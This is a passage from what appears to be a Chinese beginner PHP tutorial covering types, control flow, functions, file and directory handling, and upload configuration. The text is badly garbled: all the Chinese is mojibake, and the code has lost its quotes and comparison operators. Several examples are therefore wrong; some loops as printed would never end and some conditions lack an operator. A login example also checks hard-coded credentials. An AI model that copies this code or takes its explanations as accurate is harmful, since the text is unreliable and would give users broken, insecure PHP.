-99999 +99999â—¾æµ®ç‚¹å‹ å°æ•° -1.9 3.25 3.00005â—¾å­—ç¬¦ä¸² hello hello â—¾æ•°ç»„ arrayï¼Œ ä¾‹å¦‚ï¼š$d = array(a, 1,c,array(1,2,3)); #æ•°ç»„æ˜¯å®¹å™¨ç±»å‹çš„æ•°æ®ï¼Œå¯ä»¥å­˜æ”¾å„ç§ç±»å‹çš„åŸºç¡€æ•°æ® $d = array(a, 1,c,array(1,2,3)); echo $d; //ä¼šæŠ¥é”™ï¼Œå› ä¸ºechoæ˜¯ç”¨æ¥è¾“å‡ºå­—ç¬¦ä¸²ç±»å‹æ•°æ®çš„ã€‚ echo $d[0]; # æ•°ç»„ç±»å‹æ˜¯å¯ä»¥é€šè¿‡ç´¢å¼•å–å€¼çš„ï¼Œç´¢å¼•æ˜¯ä»0å¼€å§‹çš„ã€‚â—¾å¯¹è±¡ object # è¿™ä¸ªéœ€è¦å­¦åˆ°ç±»ä¹‹åæ‰èƒ½çœ‹åˆ°â—¾èµ„æºç±»å‹ Resource # æ–‡ä»¶ç­‰èµ„æºæ•°æ®â—¾NULL ç©º # $a = null; æå‰å®šä¹‰ï¼Œä½†æ˜¯ä¸æƒ³èµ‹å€¼çš„æ—¶å€™å°±å¯ä»¥è¿™æ ·ç”¨ ## æŸ¥çœ‹å˜é‡å¯¹åº”å€¼çš„ç±»å‹ï¼š // 1.ä½¿ç”¨â€œgettype(ä¼ å…¥ä¸€ä¸ªå˜é‡var)â€æ¥æ˜¾ç¤ºå˜é‡varçš„ç±»å‹; åªä¼šæ˜¾ç¤ºç±»å‹ // 2.ä½¿ç”¨â€œvar_dump(ä¼ å…¥ä¸€ä¸ªå˜é‡var)â€æ¥æ˜¾ç¤ºå˜é‡varçš„ç±»å‹; ä¼šæ˜¾ç¤ºå…·ä½“å†…å®¹æ‰“å°arrayï¼š $a = array(1,2,3); print_r($a); 4,php è¿ç®—ç¬¦4-1 ç®—æ•°è¿ç®—ç¬¦å­˜åœ¨ä¼˜å…ˆçº§ ï¼ˆä¹˜é™¤ åŠ å‡ï¼‰ï¼Œæå‡ä¼˜å…ˆçº§å°±åŠ æ‹¬å·ã€‚ 4-2 è‡ªå¢è‡ªå‡ 4-3 æ¯”è¾ƒè¿ç®—ç¬¦ 4-4 èµ‹å€¼è¿ç®—ç¬¦ 4-5 é€»è¾‘è¿ç®—ç¬¦ 4-6 ä¸‰å…ƒè¿ç®—?php $x = true; $x ? $y = 5 : $y = 6; //è¾“å‡º5 echo $y;? 5 PHPæµç¨‹æ§åˆ¶5-1 if?phpheader(Content-Type: text/html; charset=utf-8);$a=rand(1,10);if ($a 5) echo éšæœºç‚¹æ•°æ¯”è¾ƒå¤§;echo br;echo å½“å‰çš„ç‚¹æ•°æ˜¯.$a;? 5-2 else?phpheader(Content-Type: text/html; charset=utf-8);$user = $_POST[username];$pass = $_POST[password];if ($user ==admin and $pass ==123456 ) echo ç™»å½•æˆåŠŸ;else echo ç™»å½•å¤±è´¥;? 5-3 elseifelse if?php// A B C å…¶ä»–$jixiao=F;if ($jixiao == A) echo å‘æ”¾1.2å€è–ªèµ„; elseif ( $jixiao ==B) echo æ­£å¸¸å‘æ”¾è–ªèµ„;else if($jixiao == C) echo å‘æ”¾90%è–ªèµ„;else echo å‘æ”¾80%è–ªèµ„;? 5-4 while?php$i = 1;while ($i = 10) $i++; echo å“ˆå“ˆ.$i.æ¬¡; ? 5-5 doâ€¦while?php$i = 0;do echo $i; while ($i 0);? 5-6 for#$i=1åˆå§‹å€¼ï¼Œ$i=10 æ¡ä»¶ï¼Œ$i++æ¯æ¬¡åŠ 1for ($i = 1; $i = 10; $i++) echo $i; 5-7 foreach# å±ç»„çš„ç´¢å¼•é»˜è®¤æ˜¯ä»0å¼€å§‹çš„æ•°å­—ï¼Œä¹Ÿå¯ä»¥è‡ªè¡ŒæŒ‡å®šç´¢å¼•$cars=array(ç‰¹ç­‰å¥–=å¸ƒåŠ è¿ª,ä¸€ç­‰å¥–=æ·è±¹ ,äºŒç­‰å¥–=æ³•æ‹‰åˆ© ,ä¸‰ç­‰å¥–=ç›èæ‹‰è’‚);foreach ($cars as $key = $value) echo trtd$key/tdtd$value/td/tr; 5-8 break$cars=array(ç‰¹ç­‰å¥–=å¸ƒåŠ è¿ª,ä¸€ç­‰å¥–=æ·è±¹ ,äºŒç­‰å¥–=æ³•æ‹‰åˆ© ,ä¸‰ç­‰å¥–=ç›èæ‹‰è’‚,å››ç­‰å¥–=è¿ˆå‡¯ä¼¦);foreach ($cars as $key = $value) if ( $key == ä¸‰ç­‰å¥– ) break; else echo $key.æ˜¯.$value.br; 5-9 continue$cars=array(ç‰¹ç­‰å¥–=å¸ƒåŠ è¿ª,ä¸€ç­‰å¥–=æ·è±¹ ,äºŒç­‰å¥–=æ³•æ‹‰åˆ© ,ä¸‰ç­‰å¥–=ç›èæ‹‰è’‚,å››ç­‰å¥–=è¿ˆå‡¯ä¼¦);foreach ($cars as $key = $value) if ( $key == ä¸‰ç­‰å¥– ) continue; else echo $key.æ˜¯.$value.br; 5-10 switch$a=5;$b=10;$c=4; //switch ($c) case 1: echo $a + $b = .($a+$b).br; break; case 2: echo $a - $b = .($a-$b).br; break; case 3: echo $a * $b = .($a*$b).br; break; case 4: echo $a / $b = .($a/$b).br; break; default: // æ¡ä»¶éƒ½ä¸æˆç«‹æ—¶æ‰§è¡Œ echo åŸæ¥å•¥ä¹Ÿä¸æ˜¯; break; 6,phpå‡½æ•°//ä¸æ”¯æŒä¼ å‚çš„å‡½æ•°function welcom() echo æ¬¢è¿å…‰ä¸´!;//è°ƒç”¨å‡½æ•°welcom();?phpheader(Content-Type: text/html; charset=utf-8); // åœ¨å“åº”å¤´ä¸­æ·»åŠ äº†content-type: utf-8ï¼Œheader()æ˜¯phpæä¾›çš„åŠ å·¥å“åº”å¤´é”®å€¼å¯¹çš„echo åšä¸€ä¸‹åŠ æ³•è®¡ç®—ï¼.br;// å‡½æ•°å£°æ˜ï¼Œæå‰å®šä¹‰äº†ä¸¤ä¸ªå½¢å¼å‚æ•°ï¼š$a, $bfunction add($a, $b) //$a = 2; //$b = 3; $c = $a + $b; echo åŠ æ³•è®¡ç®—ç»“æœä¸ºï¼š.$c.br; // å‡½æ•°è°ƒç”¨ï¼š 3ï¼Œ4å®é™…å‚æ•°add(3,4); echo è®¡ç®—ç»“æŸ...br;?//è¿”å›å€¼// å‡½æ•°å£°æ˜ï¼Œæå‰å®šä¹‰äº†ä¸¤ä¸ªå½¢å¼å‚æ•°ï¼š$a, $bfunction add($a, $b) //$a = 2; //$b = 3; $c = $a + $b; // echo åŠ æ³•è®¡ç®—ç»“æœä¸ºï¼š.$c.br; return $c; // å‡½æ•°è°ƒç”¨ï¼š 3ï¼Œ4å®é™…å‚æ•°$ret = add(3,4);echo $ret.br; echo è®¡ç®—ç»“æŸ...br; 7ï¼Œå†…ç½®å‡½æ•°7-1 æ–‡ä»¶åŒ…å«çš„å‡½æ•° 7-2 æ•°å­¦å¸¸ç”¨å‡½æ•° 7-3 å­—ç¬¦ä¸²å¸¸ç”¨å‡½æ•°echo FILE; æ‰“å°å½“å‰æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ã€‚ä¸‹é¢å‡½æ•°å¤§å®¶å­¦ä¹ ä¸€ä¸‹æˆ‘æ ‡ç€ *** çš„å³å¯ echo __FiLE__./br; // D:\\ruanjian\\phpstudy_pro\\WWW\\index.phpecho dirname(__FILE__)./br; // D:\\ruanjian\\phpstudy_pro\\WWW 7-4 æ—¶é—´æ—¥æœŸå‡½æ•°// æ—¶åŒºçš„æŠ¥é”™ï¼Œä¿®æ”¹php.iniï¼Œdate.timezone = Asia/Shanghai$d = date(Ymd H:i:s); # æ ¼å¼åŒ–æ—¶é—´æ—¥æœŸçš„ã€‚$d = date(Ymd H:i:s, 1661910865); # é€šè¿‡æŸä¸ªæ—¶é—´æˆ³æ¥æ ¼å¼åŒ–æ—¶é—´$t = time(); # å½“å‰æ—¶é—´æˆ³?php $mytime = getdate(); // å¾—åˆ°å½“å‰æ—¶é—´æ—¥æœŸçš„ä¸€ä¸ªå±ç»„ // $mytime = getdate(1661910865); echo å¹´ :.$mytime[year].br; echo æœˆ :.$mytime[mon].br; echo æ—¥ :.$mytime[mday].br; echo æ—¶ :.$mytime[hours].br; echo åˆ† :.$mytime[minutes].br; echo ç§’ :.$mytime[seconds].br; echo ä¸€ä¸ªå°æ—¶ä¸­çš„ç¬¬å‡ é’Ÿ :.$mytime[minutes].br; echo è¿™æ˜¯ä¸€åˆ†é’Ÿçš„ç¬¬å‡ ç§’ :.$mytime[seconds].br; echo æ˜ŸæœŸåç§° :.$mytime[weekday].br; echo æœˆä»½åç§° :.$mytime[month].br; echo æ—¶é—´æˆ³ :.$mytime[0].br;? 7-5 æ•°ç»„å¸¸ç”¨å‡½æ•°ä¸»è¦æ˜¯æ•°ç»„å…ƒç´ çš„å¢åˆ æ”¹æŸ¥æ“ä½œã€‚ ?phpheader(Content-Type: text/html; charset=utf-8); // åœ¨å“åº”å¤´ä¸­æ·»åŠ äº†content-type: utf-8ï¼Œheader()æ˜¯phpæä¾›çš„åŠ å·¥å“åº”å¤´é”®å€¼å¯¹çš„$a = array(aa, bb, 33, 55);echo $a[0].br;echo var_dump($a).br;$a[5] = kk;echo var_dump($a).br;$a[1] = cc;echo var_dump($a).br;//unset()åˆ é™¤unset($a[1]);echo var_dump($a).br;? 8,phpæ–‡ä»¶å’Œç›®å½•æ“ä½œreadfile() //è¯»å–æ–‡ä»¶å†…å®¹ï¼Œå¹¶è¿”å›æ–‡ä»¶çš„é•¿åº¦ï¼Œè¿™ä¸ªæ²¡å•¥ç”¨file_get_contents(æ–‡ä»¶è·¯å¾„) //è¯»å–æ–‡ä»¶ï¼Œæ”¯æŒæœ¬åœ°æ–‡ä»¶å’Œè¿œç¨‹æ–‡ä»¶urlfile_put_contents(æ–‡ä»¶è·¯å¾„, å†…å®¹) //ä¿å­˜æ–‡ä»¶// readfileä¼šè‡ªåŠ¨æ‰“å°æ–‡ä»¶å†…å®¹ï¼Œ$a = readfile(1.txt);echo br;echo $a; //æ–‡ä»¶é•¿åº¦// å†™å…¥æ•°æ® $a = aabbkkdd;file_put_contents(1.txt, $a); // æ²¡æœ‰æ–‡ä»¶ä¼šè‡ªåŠ¨åˆ›å»º$b = ooooo;file_put_contents(1.txt, $b); // æ¯æ¬¡å†™å…¥æ–°æ•°æ®éƒ½ä¼šå…ˆæ¸…ç©ºåŸæ–‡ä»¶æ•°æ®//è¯»å–æ–‡ä»¶å†…å®¹$a = file_get_contents(1.txt);$a = file_get_contents(http://www.baidu.com/img/flexible/logo/pc/result.png); //ç›´æ¥è¯·æ±‚httpsçš„ç½‘å€ä¼šæŠ¥é”™ï¼Œä¼‘è¦ä¿®æ”¹é…ç½®ï¼Œ1.windowsä¸‹çš„PHPï¼Œåªéœ€è¦åˆ°php.iniä¸­æŠŠextension=php_openssl.dllå‰é¢çš„;åˆ æ‰ï¼Œé‡å¯æœåŠ¡å°±å¯ä»¥äº†ã€‚2.linuxä¸‹çš„PHPï¼Œå°±å¿…é¡»å®‰è£…opensslæ¨¡å—ï¼Œå®‰è£…å¥½äº†ä»¥åå°±å¯ä»¥è®¿é—®äº†ã€‚// file_put_contents(1.txt, $a) # ç›´æ¥å°†è¯»å–çš„æ–‡ä»¶è¾“å…¥å†™å…¥åˆ°æœ¬åœ°æ–‡ä»¶ä¸­echo $a;# æ³¨æ„ï¼šæ–‡ä»¶è¯»å†™çš„å†…å®¹éƒ½æ˜¯å­—ç¬¦ä¸²æ•°æ®æ ¼å¼ã€‚ 8-1 fopenfopenã€freadã€fwriteã€fcloseæ“ä½œè¯»å–æ–‡ä»¶ã€‚ resource fopen ( string $æ–‡ä»¶å, string æ¨¡å¼) string fread ( resource $æ“ä½œèµ„æº(ä¹Ÿå°±æ˜¯æ–‡ä»¶è·¯å¾„), int è¯»å–é•¿åº¦) bool fclose ( resource $æ“ä½œèµ„æº ) æ³¨ï¼šresource ã€stringã€boolè¡¨ç¤ºçš„æ˜¯æ–¹æ³•çš„è¿”å›å€¼ ã€‚ $a = fopen(1.txt, r)#$b = fread($a,18);$b = fgets($a);echo $b.br;while(!feof($a)) // !feof($a)è¡¨ç¤ºå¦‚æœè¯»åˆ°æ–‡ä»¶æœ€åäº†ã€‚ $b = fgets($a); echo $b.br; $b = fwrite($a, aaaaa); //å¤±è´¥è¿”å›falseï¼ŒæˆåŠŸå°±è¿”å›å†™å…¥çš„å­—ç¬¦ä¸ªæ•°echo $b.br;if ($b == false) // ræ¨¡å¼æ‰“å¼€çš„æ–‡ä»¶ä¸èƒ½å†™å…¥,r+æ¨¡å¼å¯ä»¥å†™ï¼Œä½†æ˜¯ä¼šä»æ–‡ä»¶å†…å®¹å¼€å¤´è¦†ç›–åŸæœ‰å†…å®¹ echo å†™å…¥å¤±è´¥;#fclose($a); 9ï¼Œç›®å½•å¤„ç†1.è¯»å–æŸä¸ªè·¯å¾„çš„æ—¶å€™åˆ¤æ–­æ˜¯å¦æ˜¯æ–‡ä»¶å¤¹2.æ˜¯æ–‡ä»¶å¤¹çš„è¯ï¼Œæ‰“å¼€æŒ‡å®šæ–‡ä»¶å¤¹ï¼Œè¿”å›æ–‡ä»¶ç›®å½•çš„èµ„æºå˜é‡3.ä½¿ç”¨readdirè¯»å–ä¸€æ¬¡ç›®å½•ä¸­çš„æ–‡ä»¶ï¼Œç›®å½•æŒ‡é’ˆå‘ååç§»ä¸€æ¬¡4.ä½¿ç”¨readdirè¯»å–åˆ°æœ€åï¼Œæ²¡æœ‰å¯è¯»çš„æ–‡ä»¶è¿”å›false5.å…³é—­æ–‡ä»¶ç›®å½• ä¾‹å¦‚ï¼šåˆ—ä¸¾å½“å‰ç›®å½•åˆ—è¡¨ $a = dirname(__FILE__); // phpå¤šè¡Œæ³¨é‡Š/* æ³¨é‡Šå†…å®¹ */echo br;$b = scandir($a);var_dump($b);foreach ($b as $key=$filename) if ($filename == . or $filename == .. ) continue; echo $filename.br;# åˆ¤æ–­ç±»å‹filetype($a.\\wp);filetype($a.\\1.txt); ç¤ºä¾‹:æŸ¥çœ‹Dç›˜ä¸‹çš„æ–‡ä»¶å’Œæ–‡ä»¶å¤¹ï¼Œå¹¶è¾“å‡ºä»–ä»¬çš„ç±»å‹ ?php //è®¾ç½®æ‰“å¼€çš„ç›®å½•æ˜¯Dç›˜ $dir = C:/phpStudy/PHPTutorial/WWW; //åˆ¤æ–­æ˜¯å¦æ˜¯æ–‡ä»¶å¤¹ï¼Œæ˜¯æ–‡ä»¶å¤¹ if (is_dir($dir)) if ($dh = opendir($dir)) //è¯»å–åˆ°æœ€åè¿”å›falseï¼Œåœæ­¢å¾ªç¯ // whileä¸­çš„æ¡ä»¶è¡¨ç¤ºï¼šå°†readdiræ¯æ¬¡è¯»å–çš„æ•°æ®èµ‹å€¼ç»™$file,ç„¶åæ¯”è¾ƒ$fileæ˜¯å¦ç­‰äºfalseï¼Œå¦‚æœç­‰falseï¼Œé‚£ä¹ˆwhileå¾ªç¯ç»“æŸ while (($file = readdir($dh)) !== false) echo æ–‡ä»¶åä¸º: $file : æ–‡ä»¶çš„ç±»å‹æ˜¯: . filetype($dir ./. $file) . br /; closedir($dh); ? 10.PHPåˆ›å»ºä¸´æ—¶æ–‡ä»¶æˆ‘ä»¬ä¹‹å‰åˆ›å»ºçš„æ–‡ä»¶éƒ½æ˜¯æ°¸ä¹…æ–‡ä»¶ã€‚ è€Œåˆ›å»ºä¸´æ—¶æ–‡ä»¶åœ¨æˆ‘ä»¬å¹³æ—¶çš„é¡¹ç›®å¼€å‘ä¸­ä¹Ÿéå¸¸æœ‰ç”¨ã€‚åˆ›å»ºä¸´æ—¶æ–‡ä»¶çš„å‡ ä¸ªå¥½å¤„ï¼šç”¨å®Œåå³åˆ é™¤ï¼Œä¸éœ€è¦å»ç»´æŠ¤è¿™ä¸ªæ–‡ä»¶çš„åˆ é™¤çŠ¶æ€ã€‚ ?php //åˆ›å»ºäº†ä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ $handle = tmpfile(); //å‘é‡Œé¢å†™å…¥äº†æ•°æ® $numbytes = fwrite($handle, å†™å…¥ä¸´æ—¶æ–‡ä»¶); // sleep(60); //å…³é—­ä¸´æ—¶æ–‡ä»¶ï¼Œæ–‡ä»¶å³è¢«åˆ é™¤ fclose($handle); echo å‘ä¸´æ—¶æ–‡ä»¶ä¸­å†™å…¥äº†.$numbytes . ä¸ªå­—èŠ‚;?//windowså­˜å‚¨åœ¨C:\\Users\\ç”¨æˆ·å\\AppData\\Local\\Tempç›®å½•ä¸­ 11ï¼ŒPHPæ‹·è´ï¼Œç§»åŠ¨ï¼Œåˆ é™¤æ–‡ä»¶11-1 é‡å‘½åæˆ‘ä»¬æ—¥å¸¸åœ¨å¤„ç†æ–‡ä»¶çš„æ—¶å€™ï¼Œå¯ä»¥åˆ é™¤æ–‡ä»¶ã€é‡å‘½åæ–‡ä»¶ä¹Ÿå¯ä»¥ä¹Ÿå¯å¤åˆ¶æ–‡ä»¶ã€‚ æˆ‘ä»¬å…ˆæ¥è¯´é‡å‘½åï¼Œé‡å‘½åçš„å‡½æ•°æ˜¯ï¼š bool rename($ æ—§å, $æ–°å); ï¼Œæ–¹æ³•çš„è¿”å›ç»“æœæ˜¯å¸ƒå°”å€¼ã€‚è¿™ä¸ªå‡½æ•°è¿”å›ä¸€ä¸ªboolå€¼ï¼Œå°†æ—§çš„åå­—æ”¹ä¸ºæ–°çš„åå­—ã€‚ ?php //æ—§æ–‡ä»¶å $filename = test.txt; //æ–°æ–‡ä»¶å $filename2 = $filename . .xx; //ä¿®æ”¹æ–‡ä»¶åç§° rename($filename, $filename2); //ç§»åŠ¨æ–‡ä»¶ï¼Œæ¯”å¦‚ç§»åŠ¨åˆ°xxç›®å½•ä¸‹ rename($filename, \\\\xx\\\\.$filename2);? 11-2 å¤åˆ¶æ–‡ä»¶å¤åˆ¶æ–‡ä»¶ï¼Œå°±ç›¸å½“äºæ˜¯å…‹éš†æŠ€æœ¯ï¼Œå°†ä¸€ä¸ªåŸæ¥çš„ä¸œè¥¿å†å…‹éš†æˆä¸€ä¸ªæ–°çš„ä¸œè¥¿ã€‚ä¸¤ä¸ªé•¿å¾—ä¸€æ¨¡ä¸€æ ·ã€‚ bool copy(æºæ–‡ä»¶,ç›®æ ‡æ–‡ä»¶)åŠŸèƒ½ï¼šå°†æŒ‡å®šè·¯å¾„çš„æºæ–‡ä»¶ï¼Œå¤åˆ¶ä¸€ä»½åˆ°ç›®æ ‡æ–‡ä»¶çš„ä½ç½®ã€‚ æˆ‘ä»¬æ¥é€šè¿‡å®éªŒå’Œä»£ç æ¥ç©ç©ï¼š ?php //æ—§æ–‡ä»¶å $filename = copy.txt; //æ–°æ–‡ä»¶å $filename2 = $filename . _new; //ä¿®æ”¹åå­—ã€‚ copy($filename, $filename2);? 11-3 åˆ é™¤æ–‡ä»¶åˆ é™¤æ–‡ä»¶å°±æ˜¯å°†æŒ‡å®šè·¯å¾„çš„ä¸€ä¸ªæ–‡ä»¶åˆ é™¤ï¼Œä¸è¿‡è¿™ä¸ªåˆ é™¤æ˜¯ç›´æ¥åˆ é™¤ã€‚ä½¿ç”¨çš„æ˜¯windowsç”µè„‘ï¼Œä½ åœ¨å›æ”¶ç«™çœ‹ä¸åˆ°è¿™ä¸ªæ–‡ä»¶ã€‚ä½ åªä¼šå‘ç°ï¼Œè¿™ä¸ªæ–‡ä»¶æ¶ˆå¤±äº†ã€‚ bool unlink(æŒ‡å®šè·¯å¾„çš„æ–‡ä»¶) ?php $filename = test2.txt; if (unlink($filename)) echo åˆ é™¤æ–‡ä»¶æˆåŠŸ $filename! ; else echo åˆ é™¤ $filename å¤±è´¥! ; ? 12ï¼Œæ–‡ä»¶å±æ€§æ“ä½œæ¯”å¦‚ï¼Œæ£€æµ‹ä¸€ä¸‹xx.txtæ–‡ä»¶æ˜¯å¦å­˜åœ¨ ?php if(file_exists(æ–‡ä»¶è·¯å¾„)) echo æ–‡ä»¶å·²å­˜åœ¨; exit; ? å¸¸ç”¨æ–‡ä»¶å±æ€§æ“ä½œ bool file_exists ( $æŒ‡å®šæ–‡ä»¶åæˆ–è€…æ–‡ä»¶è·¯å¾„)## åŠŸèƒ½ï¼šæ–‡ä»¶æ˜¯å¦å­˜åœ¨ã€‚bool is_readable ( $æŒ‡å®šæ–‡ä»¶åæˆ–è€…æ–‡ä»¶è·¯å¾„)## åŠŸèƒ½ï¼šæ–‡ä»¶æ˜¯å¦å¯è¯»bool is_writeable ( $æŒ‡å®šæ–‡ä»¶åæˆ–è€…æ–‡ä»¶è·¯å¾„) ### åŠŸèƒ½ï¼šæ–‡ä»¶æ˜¯å¦å¯å†™bool is_executable ( $æŒ‡å®šæ–‡ä»¶åæˆ–è€…æ–‡ä»¶è·¯å¾„)## åŠŸèƒ½ï¼šæ–‡ä»¶æ˜¯å¦å¯æ‰§è¡Œbool is_file ( $æŒ‡å®šæ–‡ä»¶åæˆ–è€…æ–‡ä»¶è·¯å¾„)## åŠŸèƒ½ï¼šæ˜¯å¦æ˜¯æ–‡ä»¶bool is_dir ( $æŒ‡å®šæ–‡ä»¶åæˆ–è€…æ–‡ä»¶è·¯å¾„)## åŠŸèƒ½ï¼šæ˜¯å¦æ˜¯ç›®å½•void clearstatcache ( void ) passå®ƒ## åŠŸèƒ½ï¼šæ¸…é™¤æ–‡ä»¶çš„çŠ¶æ€ç¼“å­˜ 13ï¼ŒPHPæ–‡ä»¶æƒé™è®¾ç½®chmod ä¸»è¦æ˜¯ä¿®æ”¹æ–‡ä»¶çš„çš„æƒé™ã€‚ä¸»è¦æ˜¯é’ˆå¯¹linuxç³»ç»Ÿçš„ï¼Œè¿™ä¸ªæˆ‘ä»¬å‰é¢å­¦è¿‡ï¼Œå°±ä¸å¤šè¯´äº†ã€‚ ?php //ä¿®æ”¹linux ç³»ç»Ÿ/var/wwwroot/æŸæ–‡ä»¶æƒé™ä¸º755 chmod(/var/wwwroot/index.html, 755); chmod(/var/wwwroot/index.html, u+rwx,go+rx); chmod(/somedir/somefile, 0755); ? æƒé™è¯´æ˜ï¼ˆr-è¯»ï¼Œw-å†™ï¼Œxæ‰§è¡Œï¼Œd-è¡¨ç¤ºæ–‡ä»¶å¤¹ï¼Œu-å½“å‰ç”¨æˆ·ï¼Œg-å½“å‰ç”¨æˆ·æ‰€åœ¨ç»„ï¼Œo-å…¶ä»–ç”¨æˆ·ï¼‰ 14ï¼ŒPHPæ–‡ä»¶è·¯å¾„å‡½æ•°æˆ‘ä»¬ç»å¸¸ä¼šé‡åˆ°å¤„ç†æ–‡ä»¶è·¯å¾„çš„æƒ…å†µã€‚ ä¾‹å¦‚ï¼š 1.æ–‡ä»¶åç¼€éœ€è¦å–å‡ºæ¥ 2.è·¯å¾„éœ€è¦å–å‡ºåå­—ä¸å–ç›®å½• 3.åªéœ€è¦å–å‡ºè·¯å¾„åä¸­çš„ç›®å½•è·¯å¾„ 4.æˆ–è€…æŠŠç½‘å€ä¸­çš„å„ä¸ªéƒ¨ä»½è¿›è¡Œè§£æå–å¾—ç‹¬ç«‹å€¼ 5.ç”šè‡³æ˜¯è‡ªå·±ç»„æˆä¸€ä¸ªurlå‡ºæ¥ ... .... å¾ˆå¤šåœ°æ–¹éƒ½éœ€è¦ç”¨è·¯å¾„å¤„ç†ç±»çš„å‡½æ•°ã€‚ æˆ‘ä»¬æŠŠå¸¸ç”¨çš„è·¯å¾„å¤„ç†å‡½æ•°ä¸ºå¤§å®¶åšäº†æ ‡æ³¨ï¼Œå¤§å®¶å¯¹ç€è¿™ä¸ªè·¯å¾„å¤„ç†å‡½æ•°è¿›è¡Œå¤„ç†å³å¯ï¼š ç¤ºä¾‹ï¼Œè®°ä½ç¤ºä¾‹ä¸­çš„å‡ ä¸ªå³å¯ ?php $path_parts = pathinfo(d:/www/index.inc.php); echo æ–‡ä»¶ç›®å½•åï¼š.$path_parts[dirname].br /; echo æ–‡ä»¶å…¨åï¼š.$path_parts[basename].br /; echo æ–‡ä»¶æ‰©å±•åï¼š.$path_parts[extension].br /; echo ä¸åŒ…å«æ‰©å±•çš„æ–‡ä»¶åï¼š.$path_parts[filename].br /; ? 15ï¼ŒPHPæ–‡ä»¶ä¸Šä¼ åœ¨webå¸¸è§æ¼æ´ä¸­æœ‰ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„æ¼æ´ï¼Œåé¢æˆ‘ä»¬ä¼šè®²åˆ°ã€‚ åœ¨æˆ‘ä»¬æ—¥å¸¸ä½¿ç”¨ä¸­ç»å¸¸ä¼šé‡åˆ°å¾ˆå¤šç§è¿™æ ·çš„æƒ…å†µï¼š æ–‡ä»¶ä¸Šä¼ éœ€è¦æ³¨æ„php.iniè¿™ä¸ªé…ç½®æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶æˆ‘ä»¬åœ¨phpstudyä¸­å°±èƒ½çœ‹åˆ° æ‰“å¼€æ–‡ä»¶ä½ç½®ï¼Œæ‰¾åˆ°php.iniæ–‡ä»¶ï¼Œå¹¶æ‰“å¼€ åªæœ‰ file_uploads on æ—¶ï¼Œphpæ‰èƒ½æ”¯æŒä¸Šä¼ æ–‡ä»¶ phpinfo()å‡½æ•°ï¼Œä¹Ÿå¯ä»¥çœ‹åˆ°è¿™äº›é…ç½®ä¿¡æ¯ã€‚ 15-1 é…ç½®é¡¹ï¼š å»ºè®®å°ºå¯¸ï¼š file_size(æ–‡ä»¶å¤§å°) upload_max_filesize post_max_size memory_limit å¦å¤–ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è„šæœ¬æ‰§è¡Œæ—¶é—´ï¼Œmax_execution_timeé…ç½®ï¼Œè¿™ä¸ªå‚æ•°çš„å•ä½ä¸ºç§’ã€‚å®ƒæ˜¯è®¾å®šè„šæœ¬çš„æœ€å¤§æ‰§è¡Œæ—¶é—´ã€‚ä¹Ÿå¯ä»¥æ ¹æ®éœ€æ±‚åšé€‚å½“çš„æ”¹å˜ã€‚é€šå¸¸ä¸éœ€è¦æ¥ä¿®æ”¹ï¼Œç³»ç»Ÿé»˜è®¤å€¼å³å¯ã€‚è¶…å¤§æ–‡ä»¶ä¸Šä¼ çš„æ—¶å€™ï¼Œå¯èƒ½ä¼šæ¶‰åŠåˆ°è¿™ä¸€é¡¹å‚æ•°çš„ä¿®æ”¹ã€‚ä¸Šä¼ æ—¶é—´å¤ªé•¿äº†ï¼Œä¼šè¶…æ—¶ã€‚å¦‚æœä½ å°†æ­¤é¡¹å‚æ•°è®¾ä¸º0ï¼Œåˆ™æ˜¯ä¸é™åˆ¶è¶…æ—¶æ—¶é—´ï¼Œä¸å»ºè®®ä½¿ç”¨ï¼Œæ–‡ä»¶å¤ªå¤§äº†ï¼Œæƒ³åˆ«çš„æ–¹å¼å¤„ç†ï¼Œä¸€èˆ¬ä¼šåˆ†å—ä¼ è¾“ ã€‚ å®Œæˆäº†php.iniçš„ç›¸å…³é…ç½®ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¼€å§‹è¯•ç€å®Œæˆç¬¬ä¸€æ¬¡æ–‡ä»¶ä¸Šä¼ äº†ã€‚åˆ«å¿˜äº†é‡å¯æœåŠ¡ã€‚ 15-2 é€šè¿‡phpè·å–webserverç›¸å…³é…ç½®ä¿¡æ¯çš„ä»£ç ?phpheader(Content-Type: text/html; charset=utf-8); // åœ¨å“åº”å¤´ä¸­æ·»åŠ äº†content-type: utf-8ï¼Œheader()æ˜¯phpæä¾›çš„åŠ å·¥å“åº”å¤´é”®å€¼å¯¹çš„$a = $_SERVER[HTTP_HOST];$b = $_SERVER[HTTP_USER_AGENT];echo $a.br;echo $b.br;? 15-3 ä¸Šä¼ æ–‡ä»¶æ­¥éª¤15-3-1.ç³»ç»Ÿè¿”å›çš„é”™è¯¯ç è¯¦è§£ æ³¨ï¼šé”™è¯¯ç ä¸­æ²¡æœ‰5ã€‚ 15-3- 2.è‡ªå®šä¹‰åˆ¤æ–­æ˜¯å¦è¶…å‡ºæ–‡ä»¶å¤§å°èŒƒå›´åœ¨å¼€å‘ä¸Šä¼ åŠŸèƒ½æ—¶ã€‚æˆ‘ä»¬ä½œä¸ºå¼€å‘äººå‘˜ï¼Œé™¤äº†php.iniä¸­è§„å®šçš„ä¸Šä¼ çš„æœ€å¤§å€¼å¤–ã€‚æˆ‘ä»¬é€šå¸¸è¿˜ä¼šè®¾å®šä¸€ä¸ªå€¼ï¼Œæ˜¯ä¸šåŠ¡è§„å®šçš„ä¸Šä¼ å¤§å°é™åˆ¶ã€‚ ä¾‹å¦‚ï¼š ## æ–°æµªå¾®åšæˆ–è€…QQç©ºé—´åªå‡†å•å¼ å¤´åƒå›¾ç‰‡2Mã€‚è€Œåœ¨ä¸Šä¼ å›¾å†Œçš„æ—¶å€™åˆå¯ä»¥è¶…è¿‡2Mæ¥ä¸Šä¼ ã€‚## æ‰€ä»¥è¯´ï¼Œå®ƒçš„ç³»ç»Ÿæ˜¯æ”¯æŒæ›´å¤§æ–‡ä»¶ä¸Šä¼ çš„ã€‚## æ­¤å¤„çš„åˆ¤æ–­æ–‡ä»¶å¤§å°ï¼Œæˆ‘ä»¬ç”¨äºé™åˆ¶å®é™…ä¸šåŠ¡ä¸­æˆ‘ä»¬æƒ³è¦è§„å®šçš„ä¸Šä¼ çš„æ–‡ä»¶å¤§å°ã€‚ 15-3- 